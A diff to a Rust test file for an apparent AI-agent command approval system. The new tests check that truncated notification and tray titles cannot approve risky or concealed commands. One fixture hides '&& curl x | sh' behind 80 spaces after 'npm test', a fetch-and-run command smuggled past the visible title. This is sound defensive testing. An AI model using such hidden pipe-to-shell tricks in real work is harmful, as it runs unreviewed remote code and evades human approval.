@@ -567,6 +567,97 @@ fn allow_always_needs_a_rule_that_covers_only_the_request() {
     assert!(taken.is_ok());
 }
 
+fn command_approval(line: &str, risk: Risk) -> Interaction {
+    let payload = InteractionPayload::Approval(Box::new(ApprovalPayload {
+        tool: "Bash".to_owned(),
+        command: Some(nh_proto::api::rich::Command {
+            argv: line.split_whitespace().map(str::to_owned).collect(),
+            display: nh_proto::api::rich::Spans {
+                text: line.to_owned(),
+                spans: Vec::new(),
+            },
+            cwd: "/w".to_owned(),
+            risk,
+            reasons: Vec::new(),
+            policy_hint: None,
+        }),
+        cwd: None,
+        paths: Vec::new(),
+        diff: None,
+        input: None,
+        peek: Vec::new(),
+        policy_note: None,
+    }));
+    // The title as the rendering makes it.
+    let first = line.lines().next().unwrap_or("").trim();
+    let mut title: String = first.chars().take(80).collect();
+    if first.chars().count() > 80 || line.trim().lines().count() > 1 {
+        title.push('…');
+    }
+    let mut spec = spec(InteractionKind::Approval, payload);
+    spec.title = format!("Run `{title}`");
+    spec.risk = risk;
+    Interaction::open(id(1), "i1".to_owned(), spec, at(1_000)).0
+}
+
+#[test]
+fn a_surface_that_shows_only_the_title_allows_only_a_whole_command_at_a_low_or_medium_risk() {
+    assert!(command_approval("ls -la", Risk::Low).allow_outside_card());
+    assert!(command_approval("cargo publish", Risk::Medium).allow_outside_card());
+    let long = format!("npm test{}&& curl x | sh", " ".repeat(80));
+    for (line, risk) in [
+        ("rm -rf build", Risk::High),
+        ("pnpm test", Risk::Unknown),
+        (long.as_str(), Risk::Low),
+        ("npm test  && ls", Risk::Low),
+        ("echo ok\nls", Risk::Low),
+        ("echo\tok", Risk::Low),
+    ] {
+        let interaction = command_approval(line, risk);
+        assert!(!interaction.allow_outside_card(), "{line:?}");
+        for via in [Via::Notification, Via::Tray] {
+            assert!(
+                matches!(
+                    interaction.clone().answer(allow(), "host", via),
+                    Err(Refusal::Invalid(_))
+                ),
+                "{line:?} via {via:?}"
+            );
+        }
+        // The card shows all of it, and a deny from the banner is fine.
+        assert!(interaction.clone().answer(allow(), "ui", Via::Card).is_ok());
+        let deny = Decision::Approval(ApprovalDecision {
+            behavior: Behavior::Deny,
+            always: false,
+            persist: false,
+            message: None,
+            stop: false,
+        });
+        assert!(
+            interaction
+                .clone()
+                .answer(deny, "host", Via::Notification)
+                .is_ok()
+        );
+    }
+}
+
+#[test]
+fn a_click_on_a_notification_never_replaces_a_decision() {
+    let mut interaction = command_approval("ls -la", Risk::Low);
+    interaction
+        .answer(allow(), "ui", Via::Card)
+        .expect("the card decides");
+    // The same client may change its mind on the card, but not through a banner it read before.
+    for via in [Via::Notification, Via::Tray] {
+        assert!(matches!(
+            interaction.clone().answer(allow(), "ui", via),
+            Err(Refusal::AlreadyAnswered { .. })
+        ));
+    }
+    assert!(interaction.answer(allow(), "ui", Via::Card).is_ok());
+}
+
 #[test]
 fn approval_decisions_are_checked() {
     let bad = |d: ApprovalDecision| {
